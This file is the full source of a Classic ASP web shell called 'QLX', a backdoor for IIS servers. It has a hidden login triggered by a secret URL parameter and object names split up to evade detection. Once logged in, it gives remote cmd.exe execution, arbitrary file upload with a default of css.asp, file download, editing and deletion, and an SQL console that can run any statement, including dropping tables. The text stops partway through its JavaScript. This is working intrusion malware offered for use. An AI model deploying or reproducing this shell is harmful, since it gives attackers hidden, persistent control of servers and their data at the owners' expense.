<%
'########版权所有 - smnk########
Server.ScriptTimeout=5000
Response.Buffer = True
On Error Resume Next
ApplicationName = "QLX" '程序标题
UserPass        = "cWx4"'进入的密码，这是加密后的密码，默认:qlx密文访问：http://www.xxx.com/shell.asp?makepwd=你的密码 即可得到

ShowFileIco     = Flase
IcoPath         = ""
logintype0      = "i" 
logintype1      = "come" '进入方式的控制，默认为：http://www.xxx.com/shell.asp?i=come
theAct          = Request("theAct")
thePath         = Request("thePath")
URL             = Request.ServerVariables("URL")
ServerURL       = Request.ServerVariables("HTTP_HOST")
ServerIP        = Request.ServerVariables("LOCAL_ADDR")
Action          = Request("Action")
RootPath        = Server.MapPath(".")
WWWRoot         = Server.MapPath("/")
FolderPath      = Request("FolderPath")
FName           = Request("FName")
Const ALL_INIT ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Const editableFileExt = "$vbs$log$asp$txt$php$ini$inc$htm$html$xml$conf$config$jsp$java$htt$lst$aspx$php3$php4$js$css$bat$asa$"
BackUrl         = "<meta http-equiv='refresh' content='1;URL=?Action=ShowFile'>"
dim EncodeGroup(63)
Dim SearchGroup(127)
Call initCodecs
If Request("makepwd")<>"" Then
echo "Your Encode PassWord is: "&MyEncode(Request("makepwd"))
Response.End()
End If
If Session("KKK")<>UserPass Then
  If Request.Form("LPass")<>"" Then
    If MyEncode(Request.Form("LPass"))=UserPass Then
      Session("KKK")=UserPass
      Response.Redirect Request.ServerVariables("HTTP_REFERER")
    Else
	 echo"Failed"
    End If
  Else
    If Request(logintype0)<>logintype1 then 
	echo "<script>window.close();</script>"
	Else
    Sl="<center><font face='wingdings' color='#006600' size='7'>"&chr(79)&"</font>"
    Sl=Sl&"<form action='"&URL&"' method='post'>"
    Sl=Sl&"<font face='wingdings' color='#006600' size='6'>"&chr(91)&"</font>&nbsp;&nbsp;<input name='LPass' type='password' size='15'>"
    Sl=Sl&"&nbsp;<input type='submit' value='Logon'></form></center>"
	echo Sl
	End If
  End If
  Response.End
End If

Sub echo(str)
  Response.Write(str)
End Sub

sub ShowErr()
  If Err Then
    echo"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If		
end sub

Dim ObT(13,2)
ObT(0,0) = "Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect"
  ObT(0,2) = "Directory"
ObT(1,0) = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"
  ObT(1,2) = "CMDSHELL"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS Build"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,2) = "ACCESS RAR"
ObT(4,0) = "Scrip"&DEfd&"ting"&DEfd&".D"&DEfd&"icti"&DEfd&"onary" 
  ObT(4,2) = "ADODBUP"
ObT(5,0) = "Adodb.connection"
  ObT(5,2) = "Database Connection"
ObT(6,0) = "Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am"
  ObT(6,2) = "File UP"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,2) = "SA-FileUp "
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,2) = "LyfUpload.UploadFile"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,2) = "ASPUpload"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,2) = "JMail"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "SMTP"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,2) = "SmtpMail"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,2) = "XMLHTTP"

For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=True
	Else
	  IsObj=false
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next

PUBLIC SUB initCodecs()
dim max, idx
max = len(ALL_INIT)
Session(chr(85))=UserPass
for idx = 0 to max - 1
EncodeGroup(idx) = mid(ALL_INIT, idx + 1, 1)
next
for idx = 0 to max - 1
SearchGroup(ASC(EncodeGroup(idx))) = idx
next
END SUB

FUNCTION MyEncode(SourceText)
if len(SourceText) = 0 then
   MyEncode = ""
   exit function
end if
by3 = (len(SourceText) \ 3) * 3
ndx = 1
do while ndx <= by3
first  = asc(mid(SourceText, ndx+0, 1))
No2 = asc(mid(SourceText, ndx+1, 1))
third  = asc(mid(SourceText, ndx+2, 1))
ret = ret & EncodeGroup(  (first \ 4) AND 63 )
ret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 \ 16) AND 15 ) )
ret = ret & EncodeGroup( ((No2 * 4) AND 60) + ((third \ 64) AND 3 ) )
ret = ret & EncodeGroup( third AND 63)
ndx = ndx + 3
loop
 if by3 < len(SourceText) then
first  = asc(mid(SourceText, ndx+0, 1))
ret = ret & EncodeGroup(  (first \ 4) AND 63 )
if (len(SourceText) MOD 3 ) = 2 then
     No2 = asc(mid(SourceText, ndx+1, 1))
     ret = ret & EncodeGroup( ((first * 16) AND 48) + ((No2 * 16) AND 15 ) )
     ret = ret & EncodeGroup( ((No2 * 4) AND 60) )
else
     ret = ret & EncodeGroup( (first * 16) AND 48)
     ret = ret & "="
end if
ret = ret & "="
end if
MyEncode = ret
END FUNCTION

Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function

Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If

If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function IsIco(ia,ib,ta)
	If ShowFileIco=true Then
      IsIco = " <img src='"&IcoPath&ia&"'> "
	  If ib<>"" Then
	  IsIco = "<img src='"&IcoPath&ib&"'> "
	  End If
	Else
	  IsIco = "&nbsp;<font face='wingdings' color='#006600' size='3'>"&ta&"</font>  "
	End If
End Function

Function MainForm()
  Sl="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
  Sl=Sl&"<input type=""hidden"" name=""Action"">"
  Sl=Sl&"<input type=""hidden"" name=""FName"">"
  Sl=Sl&"</form>"
  Sl=Sl&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  Sl=Sl&"<tr><td height='30' colspan='2'>"
  Sl=Sl&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
  Sl=Sl&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
  Sl=Sl&"<tr><td width='60' align='center'>Path：</td><td>"
  Sl=Sl&"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
  Sl=Sl&"</td><td width='60' align='center'><input name='Submit' type='submit' value='GoTo'>" 
  Sl=Sl&"</td></tr></form></table></td></tr><tr><td width='160'>"
  Sl=Sl&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
  Sl=Sl&"<td>"
  Sl=Sl&"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
  Sl=Sl&"</td></tr></table>"
  echo Sl
End Function


Function MainMenu()
  Sl="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
  Sl=Sl&"<tr><td height='5'></td></tr>"
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("minus.gif","computer.gif","o")&"Directory"
  Sl=Sl&"</td></tr>"
  If Not ObT(0,1) Then
    Sl=Sl&"<tr><td height='20'></td></tr>"
  Else
  Set ABC=New LBF:Sl=Sl&ABC.ShowDriver():Set ABC=Nothing
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>WEB Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>Sweet Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath("C:\Program Files")&""")'>Program Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath("c:\Documents and Settings\All Users")&""")'>All User Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath("C:\Winnt\System32\inetsrv")&""")'>Inetsrv Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","folder.gif","0")
  Sl=Sl&"<a href='javascript:ShowFolder("""&RePath("C:\Winnt\System32\Logfiles")&""")'>Logs Root</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","computer.gif",chr(43))
  Sl=Sl&"<a href='javascript:FullForm("""&replace("C:\Winnt\system32\AUTOEXEC.NT","\","\\")&""",""EditFile"")'>Edit AutoFile</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl& IsIco("minus.gif","newfolder.gif",chr(38))
  Sl=Sl&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>New Folder</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl&IsIco("minus.gif","newfile.gif",chr(63))
  Sl=Sl&"<a href='?Action=EditFile' target='FileFrame'>New Text</a>"
  Sl=Sl&"</td></tr>"
  End If
  echo Sl:Sl=""
  
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("minus.gif","main.gif",chr(60))
  Sl=Sl&"<a href='?Action=UpFile' target='FileFrame'>File Up</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("plus.gif","main.gif","o")
  Sl=Sl&"DataBase Operate"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl&IsIco("minus.gif","newfile.gif","4")
  Sl=Sl&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>New MDB</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl&IsIco("minus.gif","mdb.gif","4")
  Sl=Sl&"<a href='?Action=DbManager' target='FileFrame'>DataBase Opera</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;"
  Sl=Sl&IsIco("minus.gif","zip.gif","4")
  Sl=Sl&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>Compress MDB</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("minus.gif","cmd.gif","o")
  Sl=Sl&"<a href='?Action=CmdShell' target='FileFrame'>Command</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("minus.gif","main.gif",chr(91))
  Sl=Sl&"<a href='?Action=ServerInfo' target='FileFrame'>Sever Info</a>"
  Sl=Sl&"</td></tr>"
  Sl=Sl&"<tr><td>&nbsp;"
  Sl=Sl&IsIco("minus.gif","htm.gif",chr(36))
  Sl=Sl&"<a href='?Action=Search' target='FileFrame'>Search</a>"
  Sl=Sl&"</td></tr></table>"
  echo Sl : Sl=""
End Function

Function ServerInfo()
  Sl="<br><table width='500' border='1' cellspacing='0' cellpadding='0' align='center'>"
  Sl=Sl&"<tr><td height='30' colspan='3' align='center' bgcolor='menu'>[Server Info]</td></tr>"
  Sl=Sl&"<tr align='center'><td height='25' width='200'>Count  Of CPU</td>&nbsp;<td>&nbsp;</td><td>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"&nbsp;</td></tr>"
  Sl=Sl&"<tr align='center'><td height='25' width='200'>Server OS</td><td>&nbsp;</td><td>"&Request.ServerVariables("OS")&"&nbsp;</td></tr>"
  Sl=Sl&"<tr align='center'><td height='25' width='200'>WEB Ver</td><td>&nbsp;</td><td>"&Request.ServerVariables("SERVER_SOFTWARE")&"&nbsp;</td></tr>"
  For i=0 To 13
    Sl=Sl&"<tr align='center'><td height='25' width='200'>"&ObT(i,0)&"</td><td>"&ObT(i,1)&"</td><td>"&ObT(i,2)&"</td></tr>"
  Next
  echo Sl
End Function

Function DownFile(Path)
  Response.Clear
  Set OSM = CreateObject(ObT(6,0))
  OSM.Open
  OSM.Type = 1
  OSM.LoadFromFile Path
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Path
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite OSM.Read
    Response.Flush
  OSM.Close
  Set OSM = Nothing
End Function


Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    HTMLEncode = S
  end if
End Function

Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      Sl="<br>The File Path In Server:"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          Sl="<center><br><br><br>File"&UName&"Up Succeed！</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	Sl=Sl&BackUrl
	echo Sl
	ShowErr()
	Response.End
  End If
    Sl="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    Sl=Sl&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    Sl=Sl&"<tr><td>"
    Sl=Sl&"Up Path：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\css.asp")&"' size='40'>&nbsp;"
    Sl=Sl&"<input name='LocalFile' type='file'  size='25'>"
    Sl=Sl&"<input type='submit' name='Submit' value='Up'>"
    Sl=Sl&"</td></tr></form></table>"
  echo Sl
End Function

Function SearchCode(InText)

if len(InText) = 0 then
SearchCode = ""
exit function
end if
Len_Real = len(InText)
do while mid(InText, Len_Real, 1) = "="
Len_Real = Len_Real - 1
loop
dim ret, ndx, by4, first, No2, third, fourth
ret = ""
by4 = (Len_Real \ 4) * 4
ndx = 1
do while ndx <= by4
first  = SearchGroup(asc(mid(InText, ndx+0, 1)))
No2 = SearchGroup(asc(mid(InText, ndx+1, 1)))
third  = SearchGroup(asc(mid(InText, ndx+2, 1)))
fourth = SearchGroup(asc(mid(InText, ndx+3, 1)))
ret = ret & chr( ((first * 4) AND 255) +   ((No2 \ 16) AND 3))
ret = ret & chr( ((No2 * 16) AND 255) + ((third \ 4) AND 15) )
ret = ret & chr( ((third * 64) AND 255) +  (fourth AND 63) )
ndx = ndx + 4
loop
if ndx < Len_Real then
first  = SearchGroup(asc(mid(InText, ndx+0, 1)))
No2 = SearchGroup(asc(mid(InText, ndx+1, 1)))
ret = ret & chr( ((first * 4) AND 255) +   ((No2 \ 16) AND 3) )
if Len_Real MOD 4 = 3 then
     third = SearchGroup(asc(mid(InText,ndx+2,1)))
     ret = ret & chr( ((No2 * 16) AND 255) + ((third \ 4) AND 15) )
end if
end if
SearchCode = ret

End Function

Function CmdShell()
  If Request("SP")<>"" Then:ShellPath = Request("SP"):Else:ShellPath = "cmd.exe":End If
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  Sl="<form method='post'><input name='cmd' Style='width:95%' class='cmd' value='"&DefCmd&"'><input type='submit' value='Run'>"
  Sl=Sl&"<textarea readonly  Style='width:100%;height:500;' class='cmd'>"
  If Request.Form("cmd")<>"" Then Sl=Sl&CreateObject(ObT(1,0)).exec(ShellPath&" /c "&DefCmd).stdout.readall
  Sl=Sl&Chr(13)&Chr(13)&Chr(13)&"Rar e.g.：c:\progra~1\winrar\rar.exe a d:\web\test\web1.rar d:\web\test\web1</textarea>"
  Sl=Sl&"SHELL Path：<input name='SP' value='"&ShellPath&"' Style='width:91%'></form>"
  echo Sl
End Function

Function CreateMdb(Path) 
   Sl="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     Sl = Sl & Path & "Great MDB Succeed!"
   End If
   Sl=Sl&BackUrl 
   echo Sl
End function

Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    Sl="<center><br><br><br>DataBase"&Path&"Not Found！</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    Sl="<center><br><br><br>DataBase"&Path&"Compress Succeed！</center>"
  End If
  Sl=Sl&BackUrl
  echo Sl
End Function

Function Search()
strKey = Request.Form("Key")
Sl="<table width=100% border=1>"
Sl=Sl&"<form method=post action='" & URL & "?Action=Search'>"
Sl=Sl&"<input type=hidden value=PageSearch name=PageName>"
Sl=Sl&"<tr>"
Sl=Sl&"<font face='wingdings' color='#006600' size='5'>"&chr(62)&"</font> Text File Search (Need FSO Support)</td>"
Sl=Sl&"</tr>"
Sl=Sl&"<tr>"
Sl=Sl&"<td colspan=2 class=trHead>&nbsp;</td>"
Sl=Sl&"</tr>"
Sl=Sl&"<tr>"
Sl=Sl&"<td>&nbsp;Path</td>"
Sl=Sl&"<td>&nbsp;<input name=thePath type=text id=thePath value='"
Sl=Sl&thePath
Sl=Sl&"' style='width:360px;'>"
Sl=Sl&"<input type=button onclick=this.form.thePath.value='" & Replace(Server.MapPath("/"), "\", "\\") & "'; value='RootPath'>"
Sl=Sl&"<input type=button onclick=this.form.thePath.value=""" & Replace(Server.MapPath("."), "\", "\\") & """; value='CurrentPath'>"
Sl=Sl&"</td>"
Sl=Sl&"</tr>"
Sl=Sl&"<tr>"
Sl=Sl&"<td width='20%'>&nbsp;KeyWord</td>"
Sl=Sl&"<td>&nbsp;<input name=Key type=text value='" & strKey & "' id=Key style='width:400px;'> "
Sl=Sl&"<select name=theAct id=theAct>"
Sl=Sl&"<option value=FileName selected>Filename</option>"
Sl=Sl&"<option value=FileContent>Content</option>"
Sl=Sl&"<option value=Both>Both</option>"
Sl=Sl&"</select>"
Sl=Sl&" <input type=submit name=Submit value=Search> </td>"
Sl=Sl&"</tr>"
Sl=Sl&"<tr>"
Sl=Sl&"<td colspan=2 class=trHead>&nbsp;</td>"
Sl=Sl&"</tr>"
Sl=Sl&"<tr align=right>"
Sl=Sl&"<td colspan=2 class=td>By QLX 2005.06&nbsp;</td>"
Sl=Sl&"</tr>"
Sl=Sl&"</form>"
Sl=Sl&"</table>"
echo Sl:Sl=""

If theAct <> "" And strKey <> "" Then
	SearchIt(strKey)
End If

End Function

Sub SearchIt(key)

Dim strPath, theFolder
Response.Buffer = True
strPath = thePath
Set fso=CreateObject(ObT(0,0))
If fso.FolderExists(strPath) = False Then
	echo(thePath & "Directory Not Exist Or Access Deny!")
End If
Set theFolder = fso.GetFolder(strPath)
echo "<br><div style='border:1px solid #d8d8f0;'>"
Select Case theAct
	Case "Both"
Call SearchFolder(theFolder, key, 1)
	Case "FileName"
Call SearchFolder(theFolder, key, 2)
	Case "FileContent"
Call SearchFolder(theFolder, key, 3)
End Select
echo "</div>"
Set theFolder = Nothing
set fso=Nothing
End Sub

Sub SearchFolder(folder, key, flag)

Dim ext, title, theFile, theFolder
For Each theFile In folder.Files
	ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
	If flag = 1 Or flag = 2 Then
	If InStr(LCase(theFile.Name), LCase(key)) > 0 Then echo FileLink(theFile, "")
	End If
	If flag = 1 Or flag = 3 Then
If Instr(EditableFileExt, "$" & ext & "$") > 0 Then
    If SearchFile(theFile, key, title) Then echo FileLink(theFile, title)
End If
	End If
Next
Response.Flush()
For Each theFolder In folder.SubFolders
	Call SearchFolder(theFolder, key, flag)
Next

end sub

Function SearchFile(f, s, title)
Dim theFile, content, pos1, pos2
On Error Resume Next
Set fso=CreateObject(ObT(0,0))
Set theFile = fso.OpenTextFile(f.Path)
content = theFile.ReadAll()
theFile.Close
Set theFile = Nothing

If Err Then
	Err.Clear
End If

SearchFile = InStr(1, content, s, 1) 
If SearchFile > 0 Then
	pos1 = InStr(1, content, "<TITLE>", 1)
	pos2 = InStr(1, content, "</TITLE>", 1)
	title = ""
	If pos1 > 0 And pos2 > 0 Then
title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
	End If
End If
set fso=Nothing
	End Function

Function FileLink(file, title)
fileLink = file.Path
If title = "" Then
title = file.Name
End If
Sl="<table width='100%'  border='0' cellspacing='1' cellpadding='0'>"
Sl=Sl&"<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''"">"
Sl=Sl&"<td height='20'><font face='wingdings' color='#006600' size='3'>2</font> "
Sl=Sl&"<a href='javascript:FullForm("""&replace(fileLink,"\","\\")&""",""DownFile"");' title='DownFile'><font color=red>"& fileLink &"</font></a></td>"
Sl=Sl&"<td width='140'>"&file.Type&"</td>"
Sl=Sl&"<td width='50'>"&clng(file.size/1024)&"K</td>"
Sl=Sl&"<td width='120'>"&file.DateLastModified&"</td>"
Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&replace(fileLink,"\","\\")&""",""EditFile"")' class='am' title='Edit'>edit</a></td>"
Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&replace(fileLink,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='Delete'>del</a></td>"
Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&replace(fileLink,"\","\\")&""",""CopyFile"")' class='am' title='Copy'>copy</a></td>"
Sl=Sl&"<td width='40' align=""center""><a href='javascript:FullForm("""&replace(fileLink,"\","\\")&""",""MoveFile"")' class='am' title='Move'>move</a></td>"
Sl=Sl&"</tr></table>"
fileLink=Sl
End Function

Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")

  Sl=Sl&"<table width='100%'  border='0' cellspacing='0' cellpadding='0'>"
  Sl=Sl&"<form name='DbForm' method='post' action=''>"
  Sl=Sl&"<tr><td width='100' height='27'> &nbsp;DataBase Connect String:</td>"
  Sl=Sl&"<td><input name='DbStr' style='width:100%' value="""&DbStr&"""></td>"
  Sl=Sl&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>E.G</option><option value=0>Access</option>"
  Sl=Sl&"<option value=1>MsSql</option><option value=2>MySql</option><option value=3>DSN</option>"
  Sl=Sl&"<option value=-1>--SQL--</option><option value=4>Show Data</option><option value=5>Add Data</option>"
  Sl=Sl&"<option value=6>Delete Data</option><option value=7>Modify Data</option><option value=8>Great Table</option>"
  Sl=Sl&"<option value=9>Delete Table</option><option value=10>Add Field</option><option value=11>Delete Field</option>"
  Sl=Sl&"<option value=12>Show All</option></select></td></tr>"
  Sl=Sl&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  Sl=Sl&"<tr><td height='30'>&nbsp;SQL Command:</td>"
  Sl=Sl&"<td><input name='SqlStr' style='width:100%' value="""&SqlStr&"""></td>"
  Sl=Sl&"<td align='center'><input type='submit' name='Submit' value='Execute' onclick='return DbCheck()'></td>"
  Sl=Sl&"</tr></form></table><span id='abc'></span>"
  echo Sl:Sl=""

  If Len(DbStr)>40 Then
  
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  Sl=Sl&"<table><tr height='25' Bgcolor='#CCCCCC'><td>Table<br>Name</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      Sl=Sl&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      Sl=Sl&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  Sl=Sl&"</tr></table>"
  echo Sl:Sl=""
  
If Len(SqlStr)>10 Then

  If LCase(Left(SqlStr,6))="select" then
    Sl=Sl&"Execute："&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=500
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    Sl=Sl&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      Sl=Sl&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    Sl=Sl&"</tr>"

    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  Sl=Sl&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    Sl=Sl&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  Sl=Sl&"</tr>"
      Rs.MoveNext
    Loop
	
	echo Sl:Sl=""
	
	SqlStr=HtmlEnCode(SqlStr)

    Sl=Sl&"<tr><td colspan="&FN+1&" align=center>Record Count："&RC&"&nbsp;Page："&Page&"/"&PN
    If PN>1 Then
      Sl=Sl&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>Homepage</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>Previous</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        Sl=Sl&i&"&nbsp;"
        Else
        Sl=Sl&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  Sl=Sl&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>Next</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>Last</a>"
    End If
    Sl=Sl&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	
	echo Sl:Sl=""
  Else	   
    Conn.Execute(SqlStr)
    Sl=Sl&"SQL语句："&SqlStr
  End If

  echo Sl:Sl=""
End If

  Conn.Close
  Set Conn=Nothing
  End If
End Function


%>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=ApplicationName&" - "&ServerIP%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#FFFFFF;}
  .tr {background-color:#EFEFEF;}
  .cmd {background-color:#000000;color:#FFFFFF}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
  a {color: black;text-decoration: none;}
  .am {color: #003366;font-size: 11px;}
-->
</style>

<script language="javascript">
<!--
  function yesok(){
    if (confirm("True Do It？"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }

  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("Target File Full Name(Copy)",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("Target File Full Name(Move)",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("Target Folder Full Name(Copy)",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
